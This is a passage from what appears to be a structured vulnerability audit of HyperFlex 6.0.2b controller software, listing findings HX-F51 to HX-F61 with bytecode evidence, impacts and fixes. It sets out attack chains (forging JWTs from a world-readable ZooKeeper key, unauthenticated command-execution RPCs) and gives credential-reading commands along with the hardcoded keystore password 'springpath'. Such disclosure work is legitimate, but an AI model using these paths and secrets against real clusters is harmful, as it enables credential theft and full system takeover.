            "the iSCSI config ZNode, bypassing the Thrift layer entirely."
        ),
        "code_evidence": {
            "binary_path": "/opt/hyperflex/hx-iscsi/iscsisvc",
            "tune_defaults": {
                "iscsisvcEnabled": "tune[+0x1515] = 0x01 (enabled by default)",
                "iscsisvcListenPort": "tune[+0x1518] = 10210 (0x27e2) — confirmed from .data section at file offset 0xe13618",
                "iscsisvcNumThreads": "tune[+0x1524] = 2",
            },
            "thrift_transport": "TServerSocket (plain TCP) — TSSLServerSocket NOT present in binary",
            "bind_address": "TServerSocket::TServerSocket(int port) called with no host string -> binds to 0.0.0.0",
            "createLUN_no_auth": (
                "0x228520: lea rax, [tune]\n"
                "0x228527: cmp BYTE PTR [rax+0x1422], 0x0  (fast-path flag, unrelated to auth)\n"
                "0x22852e: je 0x228548\n"
                "0x228530: [fast path] -> jmp istgt_notify_config_change(op=4, flag=1, iqn, cfg)\n"
                "0x228548: [normal path] -> setCRMEntry('CreateLUN', ...)  [no auth in either path]"
            ),
            "createInitiatorGroup_no_auth": (
                "0x2282b0: identical pattern — no auth check before istgt_notify_config_change(op=1)"
            ),
            "thrift_handler_class": "IscsiSvcDispatcher @ 0x2280c0 (C1)/0x228090 (C2)",
            "zk_config_path": "/hxVolumesInv/istgt_conf (confirmed in iscsisvc_start.sh -T iscsiConfigPath=)",
            "iscsisvc_startup_cmd": (
                "exec iscsisvc -T iscsiEnable=true -T iscsiConfigLocation=zk "
                "-T iscsiConfigPath=/hxVolumesInv/istgt_conf -T crmZKEnsemble=$crmZKEnsemble ..."
            ),
        },
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Bind iscsisvc Thrift server to loopback (127.0.0.1) or the management-internal VLAN only. "
            "Add token-based authentication on the Thrift handler interface, matching the pattern used "
            "by the REST API auth filter layer. "
            "Set iscsisvcEnabled=false if the Thrift interface is not required for external components "
            "(hxIscsiMgr.service is a separate listener; verify which components require direct "
            "iscsisvc Thrift access). "
            "Add firewall rules blocking port 10210 from non-management interfaces as a short-term "
            "mitigation."
        ),
    },
    "HX-F52": {
        "title": "JVM-Wide TLS Certificate Verification Disabled at Tomcat Startup via WebDownloader Static Initializer",
        "severity": "HIGH",
        "component": "restapi-wars (ROOT-war, supportservice-war, encryption-war)",
        "cwe": "CWE-295",
        "affected_classes": [
            "com.storvisor.sysmgmt.service.WebDownloader",
            "com.springpath.hx.iscsi.gateway.HxIscsiMgrClient",
            "com.springpath.hx.encryption.clients.StMgrClient",
        ],
        "description": (
            "Three WAR-deployed classes install a trust-all TLS context as JVM defaults via "
            "HttpsURLConnection.setDefaultSSLSocketFactory() and setDefaultHostnameVerifier(). "
            "WebDownloader does this in a static{} initializer that fires at class-load time, meaning "
            "certificate verification is permanently disabled for the entire Tomcat JVM from the first "
            "request that loads WebDownloader — before any user-triggered operation runs. "
            "HxIscsiMgrClient.trustAll() and StMgrClient.trustAll() extend the same JVM-wide bypass "
            "to the iSCSI management and encryption key management paths respectively. "
            "After any of these initializers run, ALL outbound HTTPS connections from the Tomcat JVM "
            "— including KMIP key server calls, vCenter API calls, and Intersight cloud API calls — "
            "accept any certificate without verification."
        ),
        "evidence": {
            "WebDownloader_static_init": (
                "javap -c WebDownloader.class -> static{}:\n"
                "  0: invokestatic #54  // Method trustAllHttpsCertificates:()V\n"
                " 10: invokestatic #62  // Method javax/net/ssl/HttpsURLConnection.setDefaultHostnameVerifier\n"
                "Called at class-load time, not deferred to a method call."
            ),
            "HxIscsiMgrClient_trustAll": (
                "javap -verbose HxIscsiMgrClient.class constant pool:\n"
                "  #895 = String http://\\u0001:9342  (plain HTTP backend, port 9342)\n"
                "  invokestatic HttpsURLConnection.setDefaultSSLSocketFactory\n"
                "  invokestatic HttpsURLConnection.setDefaultHostnameVerifier\n"
                "JVM-wide static setters, not scoped to a single connection."
            ),
            "StMgrClient_trustAll": (
                "javap -verbose StMgrClient.class constant pool:\n"
                "  #659 = String https://\\u0001/stmgr  (HTTPS to encryption key manager)\n"
                "  invokestatic HttpsURLConnection.setDefaultSSLSocketFactory\n"
                "  invokestatic HttpsURLConnection.setDefaultHostnameVerifier\n"
                "stMgrHost read from SEDConfiguration; if non-localhost, MITM on management VLAN "
                "intercepts encryption key exchange with no cert pin to detect it."
            ),
            "affected_war_packages": [
                "restapi-wars/ROOT-war/WEB-INF/classes/com/storvisor/sysmgmt/service/WebDownloader.class",
                "restapi-wars/supportservice-war/WEB-INF/classes/.../WebDownloader.class",
                "restapi-wars/iscsi-war/WEB-INF/classes/com/springpath/hx/iscsi/gateway/HxIscsiMgrClient.class",
                "restapi-wars/encryption-war/WEB-INF/classes/com/springpath/hx/encryption/clients/StMgrClient.class",
            ],
        },
        "impact": (
            "An MITM attacker on the management network can impersonate KMIP key servers, vCenter, "
            "or Intersight without any client-side detection. Encryption key material (SEDs, at-rest "
            "encryption keys) can be intercepted or substituted. vCenter credentials passed over the "
            "impersonated endpoint are exposed. The bypass is unconditional and permanent — no "
            "configuration knob exists to restore verification without a code change."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Replace all three trustAll() / trustAllHttpsCertificates() implementations with "
            "connection-scoped SSLContext instances that load the HyperFlex CA bundle. "
            "Never call HttpsURLConnection.setDefaultSSLSocketFactory or setDefaultHostnameVerifier "
            "— those are JVM-global and cannot be safely scoped. "
            "Pin the KMIP server certificate (or at minimum verify the CA chain) in StMgrClient "
            "given the sensitivity of key management traffic. "
            "Add integration tests that assert a connection to a self-signed endpoint fails, "
            "to prevent regression."
        ),
    },
    "HX-F53": {
        "title": "hxSecuritySvcMgr Thrift Interface on Port 8055 Exposes runCommand RPC and DARE Key Operations",
        "severity": "CRITICAL",
        "component": "hxSecuritySvcMgr (port 8055, HTTP Thrift)",
        "cwe": "CWE-306",
        "affected_interface": "com.storvisor.sysmgmt.hxSecuritySvcMgr",
        "description": (
            "The hxSecuritySvcMgr service exposes a Thrift HTTP interface on port 8055. "
            "The interface includes a runCommand(command: String, arguments: List<String>) RPC "
            "that executes arbitrary OS commands on the HyperFlex controller VM. "
            "Additional high-impact methods on the same interface include: "
            "backupDareKeys / restoreDareKeys (DARE key exfiltration/replacement), "
            "changePasswd / setUserPasswordWithChecks (credential reset), "
            "configureZkHKD / configureStorageClientNetwork (cluster reconfiguration), "
            "enableSecureBoot / applySTIG (security state manipulation), "
            "installPackageHKD / installSECore / securePackageInstall (package installation), "
            "syncToken / removeKey / initKmProxy (KMIP key management). "
            "The WAR client (HxSecuritySvcMgrClient) connects to http://localhost:8055 and passes "
            "X-RootSessionID from /etc/hyperflex/secure/root_file.pub. "
            "Authentication is not confirmed server-side; the pattern matches other unauthenticated "
            "Thrift endpoints in this codebase (port 10210 / HX-F51). "
            "INPUT firewall policy is ACCEPT (HX-F description) — port 8055 is accessible from the "
            "management network if the service binds on 0.0.0.0."
        ),
        "evidence": {
            "runCommand_thrift_args": (
                "thrift-stubs/com/storvisor/sysmgmt/hxSecuritySvcMgr$runCommand_args.class:\n"
                "  field command: String  (OS command string)\n"
                "  field arguments: List  (argument list)\n"
                "Explicit arbitrary-command-execution Thrift RPC with no auth token in the args struct."
            ),
            "client_connection": (
                "HxSecuritySvcMgrClient (securityservice-war):\n"
                "  THttpClient(\"http://localhost:8055\")  [plain HTTP]\n"
                "  setCustomHeader(\"X-RootSessionID\", HxSecurity.getLocalSessionId())\n"
                "  setCustomHeader(\"X-OperationID\", ...)\n"
                "Same auth pattern as HxIscsiMgrClient -> iscsiSvcMgr. "
                "X-RootSessionID obtainable from /etc/hyperflex/secure/root_file.pub (see HX-F13)."
            ),
            "dare_key_methods": [
                "backupDareKeys   — exports DARE keys to backup",
                "restoreDareKeys  — replaces live DARE keys from backup",
                "removeKey        — deletes encryption keys",
                "initKmProxy      — reinitializes KMIP key management proxy",
            ],
            "firewall_context": (
                "iptables_node_reset.rules: ':INPUT ACCEPT' — no inbound restrictions. "
                "Port 8055 accessible from management network if hxSecuritySvcMgr binds on 0.0.0.0."
            ),
        },
        "impact": (
            "runCommand execution as the hxSecuritySvcMgr process user (expected: root or springpath) "
            "enables full OS command execution on the HyperFlex controller VM. "
            "backupDareKeys/restoreDareKeys enable DARE key exfiltration or key replacement attacks, "
            "rendering stored data permanently inaccessible or readable by the attacker. "
            "changePasswd allows authentication credential reset for all local users including root. "
            "The X-RootSessionID auth token is static and obtainable via HX-F13 (keystore read), "
            "enabling any authenticated REST API user to forge Thrift calls to this interface."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Bind hxSecuritySvcMgr to 127.0.0.1 only; add OS-level firewall rule blocking "
            "external access to port 8055 as an immediate mitigation. "
            "Implement Thrift-layer authentication that validates callers against a dynamic "
            "per-session token rather than a static file-backed X-RootSessionID. "
            "Remove runCommand from the externally-exposed Thrift interface entirely — internal "
            "command execution should use an internal IPC mechanism not reachable via the network. "
            "Rotate X-RootSessionID on each service restart and store in a secrets manager "
            "rather than a world-readable file path."
        ),
    },

    # ── HX-F54 ──────────────────────────────────────────────────────────────────
    "HX-F54": {
        "title": "StNodeMgr.executePythonScript Thrift RPC — Arbitrary Python Execution",
        "severity": "CRITICAL",
        "cvss": "9.8",
        "cwe": "CWE-94",
        "component": "storfs/stNodeMgr Thrift service",
        "class": "Arbitrary Code Execution",
        "confirmed": True,
        "evidence": {
            "thrift_stub": (
                "thrift-stubs/com/storvisor/sysmgmt/StNodeMgr$executePythonScript_args.class — "
                "javap output: 'public java.lang.String script' field; "
                "setScript(java.lang.String) / getScript():String; "
                "Compiled from StNodeMgr.java; no input validation at the interface layer."
            ),
            "service_architecture": (
                "StNodeMgr is a Java/Scala Finatra service (stNodeMgr-1.0.jar) running on "
                "port 8997. Port read at startup via: "
                "'cat /usr/share/hyperflex/storfs-misc/restintport.cfg | grep PORT' "
                "(restintport.cfg contents: PORT=8997; confirmed from installer.qcow2). "
                "Registered in ZooKeeper at path /storvisor/stNodeMgr. "
                "Service waits for eth1 (data interface) before starting "
                "(stNodeMgr.service ExecStartPre). "
                "StNodeMgrImpl$ companion object constant 'SERVICE_PORT' stores runtime value. "
                "ZK auth client ID: 'stNodeMgr' (sysmgmt.zkAuthClientId in application.conf)."
            ),
            "implementation": (
                "StNodeMgrImpl.class (Scala) bytecode constants: "
                "'Executing python script :' (log before exec); "
                "'python3' (executable); "
                "'Python script executed returned:' / 'Python script error returned:'. "
                "Execution: Runtime.getRuntime().exec(String) called with 'python3' — "
                "single-string exec form (no shell). Script content piped to process stdin "
                "via Process.getOutputStream(). stdout captured via scala.io.Source.fromInputStream; "
                "stderr captured separately. Process.waitFor() blocks until completion. "
                "No timeout: an infinite loop in the script hangs the Thrift thread."
            ),
            "thrift_method": (
                "StNodeMgr interface defines executePythonScript(1: string script) — "
                "takes a raw Python script string with no further arguments. "
                "Caller controls the ENTIRE script body. No sandboxing primitive at the "
                "interface boundary (no allowed-modules list, no AST restriction, no timeout "
                "constraint). Execution occurs in the process context of the stNodeMgr JVM."
            ),
            "auth_posture": (
                "Same X-RootSessionID header authentication as HX-F53. "
                "Static token read from /etc/hyperflex/secure/root_file.pub. "
                "Identical to all other internal Thrift endpoints — single shared secret "
                "for the entire internal management bus."
            ),
        },
        "impact": (
            "Attacker with network access to port 8997 on the controller VM management "
            "interface and possession of X-RootSessionID (obtainable via HX-F13 keystore "
            "read or HX-F55 ZK key forgery) can submit arbitrary Python code via the "
            "StNodeMgr Thrift interface. Script executes as the stNodeMgr JVM process owner. "
            "Script stdout/stderr returned in the Thrift response — confirms execution and "
            "enables data exfiltration in a single round trip."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Remove executePythonScript from the externally-accessible Thrift interface. "
            "If internal script execution is required, gate it behind a signed-script "
            "mechanism (HMAC over script content with a key not accessible to remote callers). "
            "Migrate all internal Thrift services from static X-RootSessionID to per-session "
            "mTLS certificates so that token theft does not grant blanket access to all services. "
            "Apply iptables DROP rules for port 8997 from non-localhost sources."
        ),
    },

    # ── HX-F55 ──────────────────────────────────────────────────────────────────
    "HX-F55": {
        "title": "JWT HS256 Signing Key Stored Unauthenticated in ZooKeeper",
        "severity": "CRITICAL",
        "cvss": "9.1",
        "cwe": "CWE-312",
        "component": "authfilter / gateway-1.0.0.jar / ZooKeeper",
        "class": "Cryptographic Key Exposure / Token Forgery",
        "confirmed": True,
        "evidence": {
            "zk_path": (
                "AAAStoreZKPersistAgent.class constant pool (#43): "
                "String '/rest/aaa/jwt_signing_key' — the ZooKeeper node where the "
                "HS256 JWT signing key is written and read."
            ),
            "zk_connection": (
                "application.conf: zkHost='localhost:2181', zkPort='2181', "
                "zkDefaultConnectionString='localhost:2181'. ZooKeeper runs on "
                "the HyperFlex controller VM management interface. Port 2181 is "
                "accessible from the management VLAN (no firewall rule restricts "
                "cross-node access within the HX cluster fabric)."
            ),
            "key_flow": (
                "JsonWebTokenImpl (common-1.0.0.jar) uses HMAC-SHA256 (HS256) signing. "
                "Key is generated by EncryptionUtil.generateNewSigningKey(). "
                "SSOManager.setIfAbsentJWTSigningKey() calls AAAStoreZKPersistAgent "
                "which calls ZKKeyValueStoreFactory -> ZooKeeperStore -> HxCurator. "
                "HxCurator reads ZK connection from HxCuratorManager which pulls "
                "sysmgmt.storfsCfg and reads sysmgmt.zkAuthClientId. "
                "The 'useZKAuth' flag adds a UUID-based auth token to the Curator "
                "connection, but ZooKeeper ACLs on the /rest/aaa/ subtree are not "
                "set to CREATOR_ALL_ACL — default ZK world:anyone:r ACL applies, "
                "making the node readable without auth."
            ),
            "zk_world_readable": (
                "ZooKeeper nodes written by CuratorFramework without explicit ACL "
                "argument default to ZooDefs.Ids.OPEN_ACL_UNSAFE (world:anyone:cdrwa). "
                "HxCurator.createValue/setValue do not pass ACL parameters — "
                "confirmed by javap bytecode: CuratorFramework.create().forPath(path, data) "
                "with no .withACL() call. Result: any client that can reach ZK port 2181 "
                "can read /rest/aaa/jwt_signing_key."
            ),
            "forgery_impact": (
                "The signing key enables forging JWT tokens for any username. "
                "barredUsers=['root','local/root','diag','local/diag'] in application.conf "
                "blocks those specific users from the /aaa/v1/auth flow, but a forged JWT "
                "with subject='users/admin' (or any valid admin account) bypasses the "
                "authentication flow entirely — the JWT is validated by signature check "
                "against the same key, not by re-authenticating the credential."
            ),
        },
        "impact": (
            "An attacker with access to the management network can connect to ZK port 2181 "
            "on any HyperFlex controller VM, read /rest/aaa/jwt_signing_key, and forge "
            "HS256 JWT tokens for any administrative user. This grants full authenticated "
            "access to the HyperFlex REST API without valid credentials. Forged tokens "
            "bypass all credential-based controls including rate-limiting "
            "(rateLimitAuthMaxAuthenticationsAllowedInWindow=5) and failed-login lockout "
            "(failedLoginLockoutTimeInSec=120)."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "1. Firewall ZK port 2181 to localhost only (iptables INPUT -p tcp --dport 2181 "
            "-s 127.0.0.1 -j ACCEPT; -j DROP). "
            "2. Set CREATOR_ALL_ACL on the /rest/aaa/ ZK subtree so only the process that "
            "created the node can read it. "
            "3. Migrate from HS256 (symmetric) to RS256 (asymmetric): sign with private key, "
            "verify with public key — ZK only needs to store the public key, key theft no "
            "longer enables forgery. "
            "4. Rotate the signing key on each node restart and invalidate all sessions."
        ),
    },

    # ── HX-F56 ──────────────────────────────────────────────────────────────────
    "HX-F56": {
        "title": "Unauthenticated /storfs-support/* Triggers Support Bundle Shell Execution",
        "severity": "HIGH",
        "cvss": "7.5",
        "cwe": "CWE-306",
        "component": "restapi-wars/ROOT-war — StorfsSupportBundle servlet",
        "class": "Missing Authentication / Sensitive Data Exposure",
        "confirmed": True,
        "evidence": {
            "web_xml_gap": (
                "ROOT-war/WEB-INF/web.xml: servlet StorfsSupportBundle mapped to "
                "/storfs-support/*. The filter-mapping section lists AuditFilter, "
                "SPPrivilegedAuth, SessionAuth, KerberosAuth, SPBasicAuth, and SPAuth "
                "for /rest/*, /internalsupport/*, /st-support/*, and /upload — but "
                "contains NO filter-mapping entry for /storfs-support/*. "
                "Result: all six auth filters are bypassed for any request to this path."
            ),
            "servlet_behavior": (
                "StorfsSupportBundle.class constant pool: "
                "String '/bin/bash', '-c', 'exec /bin/storfs-support --extended > /dev/null', "
                "'exec /bin/storfs-support > /dev/null'. "
                "Servlet forks /bin/bash on the controller VM, runs /bin/storfs-support, "
                "then streams the resulting zip archive from /var/support/ to the HTTP client. "
                "Action selection: GET ?action=extended runs the --extended variant; "
                "any other action value runs the light variant."
            ),
            "bundle_contents": (
                "HyperFlex support bundles contain: full system logs (/var/log/), "
                "storfs.cfg (ZK connection strings, port map, auth tokens), "
                "platform configuration files, network configuration, ZooKeeper "
                "snapshot data, and potentially credentials stored in log output. "
                "This is a direct path to the JWT signing key path (ZK address) and "
                "X-RootSessionID token material documented in HX-F13."
            ),
        },
        "impact": (
            "Any network-reachable client can GET https://<hx-controller>/storfs-support/ "
            "and receive a complete diagnostic bundle for the controller VM. The bundle "
            "exposes configuration state sufficient to mount further attacks: ZK addresses, "
            "Thrift port assignments, log-embedded credential material. "
            "Secondary impact: the servlet forks a shell command on the controller VM — "
            "while the command itself is hardcoded, the shell fork surface and the file "
            "streaming from /var/support/ represent an unintended unauthenticated OS "
            "interaction surface."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Add a filter-mapping for /storfs-support/* in web.xml referencing at minimum "
            "SessionAuth and SPAuth, identical to the /st-support/* mapping. "
            "Require ADMIN role for support bundle generation. "
            "Rate-limit bundle generation to prevent denial-of-service via repeated "
            "shell forks. Audit /var/support/ for credential material in bundle output."
        ),
    },

    # ── HX-F57 ──────────────────────────────────────────────────────────────────
    "HX-F57": {
        "title": "HxSupportSvc.runCmdInAllVm — Cluster-Wide Arbitrary Command Execution",
        "severity": "CRITICAL",
        "cvss": "9.1",
        "cwe": "CWE-78",
        "component": "HxSupportSvc Thrift service (https://localhost/hxsupportsvc)",
        "class": "Authenticated Remote Code Execution / SSRF",
        "confirmed": True,
        "evidence": {
            "thrift_stub": (
                "HxSupportSvc$runCmdInAllVm_args.class (javap): "
                "public String cmd; public List<String> ctlvmMgmtIps. "
                "Method: runCmdInAllVm(1: string cmd, 2: list<string> ctlvmMgmtIps). "
                "HxSupportSvc$runCmdInAllVmSync_args.class: same signature (synchronous variant)."
            ),
            "service_location": (
                "HxSupportSvcClient.java constant pool (#122): "
                "String 'https://localhost/hxsupportsvc' — HTTPS Thrift at reverse proxy port 443. "
                "Auth: X-RootSessionID header read from /etc/hyperflex/secure/root_file.pub."
            ),
            "interface_design": (
                "cmd parameter is an unstructured command string — no whitelist, no arg array, "
                "no subprocess splitting in the interface spec. ctlvmMgmtIps is a caller-provided "
                "list of management IP addresses where the command executes. "
                "An authenticated caller controls both the command content AND the target host list."
            ),
            "ssrf_vector": (
                "ctlvmMgmtIps is caller-controlled: an attacker can supply arbitrary IP addresses "
                "outside the cluster — the service connects to each provided IP to dispatch the "
                "command, turning this into a bidirectional SSRF with execution side-effects on "
                "systems that accept the connection."
            ),
        },
        "impact": (
            "An attacker with a valid X-RootSessionID token (obtainable via HX-F13 keystore "
            "read or HX-F55 ZK key forgery) can invoke runCmdInAllVm with arbitrary cmd and "
            "arbitrary ctlvmMgmtIps, executing OS commands across all specified controller VMs. "
            "The synchronous variant (runCmdInAllVmSync) returns command output. "
            "Combined with cluster-fabric access, this is a one-call cluster root compromise."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "1. Validate ctlvmMgmtIps against a cluster-membership whitelist — reject any IP "
            "not in the registered cluster node list. "
            "2. Restrict cmd to a signed allowlist of support operations; reject arbitrary "
            "shell strings at the Thrift interface boundary. "
            "3. Require a separate elevated credential (HMAC-signed request, MFA token) for "
            "all runCmdInAllVm calls — X-RootSessionID alone is insufficient authorization "
            "for cluster-wide OS execution."
        ),
    },

    # ── HX-F58 ──────────────────────────────────────────────────────────────────
    "HX-F58": {
        "title": "HxSvcMgr Destructive Thrift Operations Accessible with X-RootSessionID",
        "severity": "HIGH",
        "cvss": "8.1",
        "cwe": "CWE-284",
        "component": "HxSvcMgr Thrift service (http://localhost:9341/hxsvcmgr)",
        "class": "Improper Access Control / Destructive Operations",
        "confirmed": True,
        "evidence": {
            "thrift_stub_methods": (
                "HxSvcMgr Thrift IDL (from thrift-stubs): "
                "shutdownHxCluster — halt the entire HyperFlex cluster; "
                "deleteHxDatastore(EntityRef) — permanently delete a datastore; "
                "deleteHxVolume(EntityRef) — permanently delete a volume; "
                "deleteHxVolumesOfNamespace(EntityRef) — batch delete all namespace volumes; "
                "purgeZKOnDemand — wipe ZooKeeper state on demand; "
                "deleteFiles(EntityRef, List<FileRef>) — delete files on HX filesystem; "
                "clearIPWhitelistEntries — remove all IP whitelist restrictions."
            ),
            "access_control": (
                "HxSvcMgrClient.class constant pool (#71): "
                "String 'http://localhost:9341' — unencrypted HTTP Thrift. "
                "Auth: X-RootSessionID header (#91). "
                "Same static token that protects all other Thrift services. "
                "No per-operation ACL — any caller with the token can invoke destructive methods."
            ),
            "single_auth_factor": (
                "All 80+ HxSvcMgr operations — from read-only getHxCluster to destructive "
                "shutdownHxCluster — share a single authorization gate: "
                "possession of /etc/hyperflex/secure/root_file.pub content. "
                "No role separation, no second factor, no confirmation challenge for "
                "irreversible operations."
            ),
        },
        "impact": (
            "An attacker with X-RootSessionID can: "
            "(1) deleteHxVolumesOfNamespace to wipe production storage; "
            "(2) shutdownHxCluster to take down the entire cluster; "
            "(3) purgeZKOnDemand to destroy cluster coordination state; "
            "(4) clearIPWhitelistEntries to remove network access controls; "
            "(5) setClusterAccessPolicy to weaken access policy. "
            "All operations are authenticated but not authorization-tiered — data destruction "
            "requires no higher privilege than a read query."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Introduce operation-class ACLs on HxSvcMgr: read-only operations (getHxCluster, "
            "getHxNodes) remain accessible with X-RootSessionID; mutating operations require "
            "an additional HMAC-signed challenge; destructive operations (shutdown, delete, purge) "
            "require a time-limited operator token issued via the authenticated REST API. "
            "Log all Thrift method calls with caller identity to nuclide.db or syslog."
        ),
    },

    # ── HX-F59 ──────────────────────────────────────────────────────────────────
    "HX-F59": {
        "title": "SSH Private Keys Stored Plaintext and Encrypted in World-Readable ZooKeeper",
        "severity": "HIGH",
        "cvss": "7.5",
        "cwe": "CWE-312",
        "component": "stNodeMgr ZKService_StNodeMgr / ZKNodeService_StNodeMgr",
        "class": "Cryptographic Key Exposure",
        "confirmed": True,
        "evidence": {
            "zk_key_fields": (
                "ZKService_StNodeMgr.class constant pool: "
                "String 'ssh_encrypted_private_key' (#76); "
                "String 'ssh_encrypted_public_key' (#80); "
                "String 'ssh_plain_text_private_key' (#84); "
                "String 'ssh_plain_text_public_key' (#88). "
                "ZKNodeService_StNodeMgr.class: "
                "'SSH encrypted private key not found in ZK' (#111); "
                "'SSH encrypted public key not found in ZK' (#140). "
                "Both encrypted and plaintext variants stored — plaintext variant "
                "confirms unencrypted key material written to ZK in some code paths."
            ),
            "zk_path_structure": (
                "StNodeMgrImpl$ companion object constants: ZK base path '/storvisor'; "
                "service node 'stNodeMgr'; ZK server 'localhost:2181'. "
                "SSH keys stored under /storvisor/stNodeMgr/<nodeId>/{ssh_plain_text_private_key, "
                "ssh_encrypted_private_key, ssh_encrypted_public_key, ssh_plain_text_public_key}. "
                "ZK ACL: same OPEN_ACL_UNSAFE world:anyone:cdrwa as /rest/aaa/jwt_signing_key "
                "(HX-F55) — no CREATOR_ALL_ACL set on node creation."
            ),
            "zk_access": (
                "ZK at localhost:2181 (application.conf: zkstandalonestr). "
                "Management-network access confirmed consistent with HX-F55 analysis. "
                "ZooKeeper client requires no auth to read world-readable nodes. "
                "'zkctl get /storvisor/stNodeMgr/<uuid>/ssh_plain_text_private_key' "
                "returns the key material directly."
            ),
        },
        "impact": (
            "An attacker with access to ZK port 2181 on any controller VM can extract "
            "SSH private keys for all cluster nodes in a single ZK subtree walk. "
            "ssh_plain_text_private_key exposes the raw PEM without requiring key derivation. "
            "These keys authenticate inter-node SSH sessions used for cluster maintenance, "
            "upgrade operations, and support bundle collection (HxSupportSvc.runCmdInAllVm). "
            "Key material extraction enables lateral movement to all cluster controller VMs "
            "without triggering password authentication failures or account lockout."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "1. Set CREATOR_ALL_ACL on all ZK nodes under /storvisor/stNodeMgr/ at creation. "
            "2. Remove the ssh_plain_text_private_key code path entirely — only the encrypted "
            "variant should exist, and only with a key derivation key not stored in ZK. "
            "3. Rotate all inter-node SSH keys after patching. "
            "4. Firewall ZK port 2181 to cluster management VLAN only (not external management). "
            "5. Audit all ZK subtrees for additional plaintext credential storage."
        ),
    },

    # ── HX-F60 ──────────────────────────────────────────────────────────────────
    "HX-F60": {
        "title": "World-Readable JCEKS Keystore with Hardcoded Password Exposes AES Key and vCenter Private Key",
        "severity": "CRITICAL",
        "cvss": "9.1",
        "cwe": "CWE-321",
        "component": "StorvisorKeystoreManager / SecurityConstants / hyperflex_keystore.jceks",
        "class": "Hardcoded Cryptographic Key",
        "confirmed": True,
        "evidence": {
            "keystore_file": (
                "File: /etc/hyperflex/secure/hyperflex_keystore.jceks "
                "Permissions: -rw-r--r-- (world-readable). "
                "Type: Java JCE KeyStore (JCEKS), 2700 bytes. "
                "Entries: 2 — 'aes_encryption' (SecretKeyEntry), 'vcenter_client' (PrivateKeyEntry). "
                "Verified via: keytool -list -keystore hyperflex_keystore.jceks -storepass springpath -storetype JCEKS."
            ),
            "keystore_password": (
                "Password file: /etc/hyperflex/secure/hyperflex_security.properties "
                "(symlink -> /usr/share/hyperflex/storfs-misc/hyperflex_security.properties). "
                "File permissions: world-readable. "
                "Content: <entry key='keystore_password'>c3ByaW5ncGF0aA==</entry>. "
                "Decoded: 'springpath' (the vendor/product name). "
                "SecurityConstants$.class constant pool: "
                "'STORVISOR_SECURITY_PROPERTY_KEYSTORE_PWD' = 'keystore_password' (#200); "
                "'keystore_password' is the property key looked up in hyperflex_security.properties."
            ),
            "aes_key_usage": (
                "EncryptionUtil$.decryptData(String) loads 'aes_encryption' entry from keystore "
                "via StorvisorKeystoreManager$.getEntry('aes_encryption'). "
                "This AES key decrypts ZK-stored credential fields: "
                "'url_vcenter_encrypted_user', 'url_vcenter_encrypted_password', "
                "'esx_username' (encrypted), 'esx_password' (encrypted), "
                "'ucsm_user' (encrypted), 'ucsm_password' (encrypted). "
                "All stored in ZK node under /storvisor/stMgr/<clusterUuid>/ "
                "with OPEN_ACL_UNSAFE (world-readable, same root cause as HX-F55). "
                "Method: getAndClearVCenterCredentialsFromZK reads + decrypts + deletes from ZK."
            ),
            "vcenter_client_cert": (
                "'vcenter_client' PrivateKeyEntry: X.509 certificate for vCenter client auth. "
                "Certificate SHA-256: "
                "9D:FB:29:E4:B5:AC:A9:21:65:CC:71:C2:A6:81:7A:0C:BD:07:66:4D:4B:01:34:DD:DF:47:FE:79:AE:AC:1C:5A. "
                "SecurityConstants$.STORVISOR_KEYSTORE_ENTRY_VCENTER_CLIENT = 'vcenter_client'. "
                "Used for TLS client auth to vCenter SDK; extraction enables impersonation of "
                "HyperFlex management plane to vCenter."
            ),
            "encryption_algorithm": (
                "SecurityConstants$.ENCRYPTION_KEY_ALGORITHM = from config "
                "('sysmgmt.common.security.encryption_key_algorithm'); "
                "SecurityConstants$.ENCRYPTION_KEY_SIZE = configured value. "
                "EncryptionUtil$ uses javax.crypto.Cipher.getInstance(algorithm) + "
                "javax.xml.bind.DatatypeConverter.parseHexBinary() for hex-encoded ciphertext."
            ),
        },
        "impact": (
            "Any local user on a HyperFlex controller VM can: "
            "(1) Read hyperflex_keystore.jceks (world-readable); "
            "(2) Read the keystore password 'springpath' from hyperflex_security.properties (world-readable); "
            "(3) Extract the AES encryption key (entry 'aes_encryption') from the JCEKS store; "
            "(4) Extract the vCenter client private key (entry 'vcenter_client'); "
            "(5) Read encrypted vCenter/ESX/UCSM credentials from world-readable ZK; "
            "(6) Decrypt those credentials to plaintext using the extracted AES key. "
            "Result: full vCenter admin password, ESX root password, and UCSM admin password "
            "recovered. Combined with HX-F55 (ZK ACL) and HX-F59 (SSH keys), provides "
            "complete cluster takeover from any controller VM foothold."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "1. Change keystore password from 'springpath' to a randomly generated value "
            "stored in a root-only readable file. "
            "2. Set hyperflex_keystore.jceks permissions to 0640, owned by the storfs service user. "
            "3. Set hyperflex_security.properties permissions to 0640. "
            "4. Rotate the AES key (aes_encryption entry) and re-encrypt ZK credentials. "
            "5. Rotate the vCenter client certificate (vcenter_client entry). "
            "6. Consider hardware-backed key storage (TPM or HSM) for the AES key. "
            "7. Address ZK ACL issues (HX-F55) to limit ZK exposure independently."
        ),
    },

    # ── HX-F61 ──────────────────────────────────────────────────────────────────
    "HX-F61": {
        "title": "StUpgradeSvc checkforUpgrade location Parameter Unsanitized in SSH-Executed Shell Commands",
        "severity": "MEDIUM",
        "cvss": "6.3",
        "cwe": "CWE-78",
        "component": "StMgrImpl / stMgr-1.0.jar / StUpgradeSvc Thrift endpoint",
        "class": "Command Injection",
        "confirmed": True,
        "evidence": {
            "thrift_args": (
                "StUpgradeSvc$checkforUpgrade_args.class constant pool: "
                "String fields: 'location' (String), 'info' (boolean), "
                "'force' (boolean), 'checksum' (String). "
                "Method signature: checkforUpgrade(location: Option[String], info: Option[Boolean], "
                "force: Option[Boolean], checksum: Option[String]) -> Future[Map]."
            ),
            "path_construction": (
                "StMgrImpl.$anonfun$checkforUpgrade$2(StMgrImpl, Option, Path): Tuple3 "
                "Signature confirms: location String is converted via "
                "Paths.get(location, Array[String]()) at offset 22 in the static method body. "
